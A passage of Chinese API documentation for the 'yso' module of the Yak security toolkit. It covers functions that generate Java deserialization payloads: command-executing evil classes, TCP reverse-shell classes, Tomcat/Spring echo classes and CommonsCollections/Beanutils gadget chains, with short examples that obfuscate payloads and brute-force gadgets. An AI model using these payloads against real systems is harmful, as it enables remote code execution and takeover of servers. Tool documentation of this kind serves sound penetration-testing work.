### GenerateHeaderEchoClassObject

#### 详细描述
GenHeaderEchoClassObject

GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，

参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


#### 定义

`GenerateHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateModifyTomcatMaxHeaderSizeEvilClassObject

#### 详细描述
GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useModifyTomcatMaxHeaderSizeTemplate 函数， 以生成在反序列化时会修改 tomcat 的 MaxHeaderSize 值的Java对象。

参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // 生成并配置ModifyTomcatMaxHeaderSize Java对象
``````````````


#### 定义

`GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateMultiEchoClassObject

#### 详细描述
GenMultiEchoClassObject

GenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显，

参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
body 回显
bodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
header 回显
headerClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


#### 定义

`GenerateMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateProcessBuilderExecEvilClassObject

#### 详细描述
GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

参数:

  - cmd: 要在生成的Java对象中执行的命令字符串



参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessBuilderExec Java对象
``````````````


#### 定义

`GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要在生成的Java对象中执行的命令字符串 |
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateProcessImplExecEvilClassObject

#### 详细描述
GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

参数:

  - cmd: 要在生成的Java对象中执行的命令字符串



参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessImplExec Java对象
``````````````


#### 定义

`GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要在生成的Java对象中执行的命令字符串 |
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateRuntimeExecEvilClassObject

#### 详细描述
GenerateRuntimeExecEvilClassObject 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

参数:

  - cmd: 要在生成的Java对象中执行的命令字符串



参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...) // 生成并配置RuntimeExec Java对象
``````````````


#### 定义

`GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要在生成的Java对象中执行的命令字符串 |
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateSleepClassObject

#### 详细描述
GenSleepClassObject

GenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象

参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
yso.GenerateSleepClassObject(yso.useSleepTime(5))
``````````````


#### 定义

`GenerateSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateSpringEchoEvilClassObject

#### 详细描述
GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。

参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象
``````````````


#### 定义

`GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateTcpReverseEvilClassObject

#### 详细描述
GenTcpReverseClassObject

GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 函数， 以生成在反序列化时会反连指定的 tcpReverseHost ，tcpReversePort 的Java对象。

参数:

  - host: 要设置的 tcpReverseHost 的 host



参数:

  - port: 要设置的 tcpReversePort 的 port



参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
host = "公网IP"
token = uuid()
classObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // 生成并配置TcpReverse Java对象
``````````````


#### 定义

`GenerateTcpReverseEvilClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` | 要设置的 tcpReverseHost 的 host |
| port | `int` | 要设置的 tcpReversePort 的 port |
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateTcpReverseShellEvilClassObject

#### 详细描述
GenTcpReverseShellClassObject

GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useTcpReverseShellTemplate ，tcpReverseShellHost ，tcpReverseShellPort 函数， 以生成在反序列化时会反连指定的 tcpReverseShellHost ，tcpReverseShellPort 的Java对象。

参数:

  - host: 要设置的 tcpReverseShellHost 的 host



参数:

  - port: 要设置的 tcpReverseShellPort 的 port



参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
host = "公网IP"
classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // 生成并配置TcpReverseShell Java对象
``````````````


#### 定义

`GenerateTcpReverseShellEvilClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` | 要设置的 tcpReverseShellHost 的 host |
| port | `int` | 要设置的 tcpReverseShellPort 的 port |
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateTomcatEchoClassObject

#### 详细描述
GenTomcatEchoClassObject

GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，

参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
body 回显
bodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
header 回显
headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


#### 定义

`GenerateTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetAllGadget

#### 详细描述
GetAllGadget 获取所有支持的Java反序列化Gadget。

这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。

对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数；

对于不支持模板实现的Gadget，会创建一个接受命令字符串参数的函数。



返回值:

  - 包含所有 Gadget 生成函数的接口切片




Example:

``````````````yak
allGadgets := yso.GetAllGadget()

	for _, gadget := range allGadgets {
	    switch g := gadget.(type) {
	    case func(...GenClassOptionFun) (*JavaObject, error):
	        // 处理模板实现的Gadget
	        obj, err := g(yso.useRuntimeExecEvilClass("whoami"))
	    case func(string) (*JavaObject, error):
	        // 处理命令执行类型的Gadget
	        obj, err := g("whoami")
	    }
	}
``````````````


#### 定义

`GetAllGadget() []any`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `[]any` | 包含所有 Gadget 生成函数的接口切片 |


### GetAllRuntimeExecGadget

#### 详细描述
GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget



返回值:

  - 所有支持命令执行的 Gadget 生成函数切片




Example:

``````````````yak
command := "whoami" // 假设的命令字符串
for _, gadget := range yso.GetAllRuntimeExecGadget() {
	javaObj, err := gadget(command)
	if javaObj == nil || err != nil {
		continue
	}
	objBytes, err := yso.ToBytes(javaObj)
	if err != nil {
		continue
	}
	// 发送 objBytes
}
``````````````


#### 定义

`GetAllRuntimeExecGadget() []RuntimeExecGadget`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `[]RuntimeExecGadget` | 所有支持命令执行的 Gadget 生成函数切片 |


### GetAllTemplatesGadget

#### 详细描述
GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget



返回值:

  - 所有支持模板实现的 Gadget 生成函数切片




Example:

``````````````yak
for _, gadget := range yso.GetAllTemplatesGadget() {
	domain := "xxx.dnslog" // dnslog 地址
	javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
	if javaObj == nil || err != nil {
		continue
	}
	objBytes, err := yso.ToBytes(javaObj)
	if err != nil {
		continue
	}
	// 发送 objBytes
}
``````````````


#### 定义

`GetAllTemplatesGadget() []TemplatesGadget`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `[]TemplatesGadget` | 所有支持模板实现的 Gadget 生成函数切片 |


### GetBeanShell1JavaObject

#### 详细描述
GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。

它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。

参数:

  - cmd: 要传入Java对象的命令字符串



返回值:

  - 修改后的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, err := yso.GetBeanShell1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````


#### 定义

`GetBeanShell1JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要传入Java对象的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 修改后的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetClick1JavaObject

#### 详细描述
GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。

用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数允许用户定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetClick1JavaObject(

	yso.useRuntimeExecEvilClass(command),
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className),
	)
``````````````


#### 定义

`GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsBeanutils183NOCCJavaObject

#### 详细描述
GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。

去除了对 commons-collections:3.1 的依赖。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsBeanutils192NOCCJavaObject

#### 详细描述
GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。

去除了对 commons-collections:3.1 的依赖。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsBeanutils1JavaObject

#### 详细描述
GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(

	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
		yso.obfuscationClassConstantPool(),
		yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollections1JavaObject

#### 详细描述
GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

参数:

  - cmd: 要设置在Java对象中的命令字符串



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, err := yso.GetCommonsCollections1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````


#### 定义

`GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollections2JavaObject

#### 详细描述
GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections2JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollections3JavaObject

#### 详细描述
GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections3JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollections4JavaObject

#### 详细描述
GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections4JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
``````````````


#### 定义

`GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 用于配置Java对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollections5JavaObject

#### 详细描述
GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

参数:

  - cmd: 要设置在Java对象中的命令字符串



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````


#### 定义

`GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollections6JavaObject

#### 详细描述
GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

参数:

  - cmd: 要设置在Java对象中的命令字符串



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````


#### 定义

`GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollections7JavaObject

#### 详细描述
GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

参数:

  - cmd: 要设置在Java对象中的命令字符串



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
``````````````


#### 定义

`GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要设置在Java对象中的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` | 生成的 Java 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GetCommonsCollections8JavaObject

#### 详细描述
GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

参数:

  - options: 用于配置Java对象的可变参数函数列表



返回值:

  - 生成的 Java 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections8JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
